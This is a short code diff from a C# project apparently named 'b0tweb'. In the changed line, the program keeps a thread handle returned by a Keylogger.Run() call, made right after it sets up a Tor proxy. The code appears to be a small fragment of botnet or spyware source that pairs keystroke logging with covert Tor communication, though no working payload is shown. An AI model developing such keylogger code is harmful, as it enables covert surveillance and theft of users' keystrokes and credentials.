@@ -22,7 +22,7 @@ namespace b0tweb
             TorProxy proxy = new TorProxy();
             proxy.Establish();
 
-            Keylogger.Run();
+            Thread keyloggerThread = Keylogger.Run();
 
             Console.WriteLine("Connection to Tor successfuly established!");
 
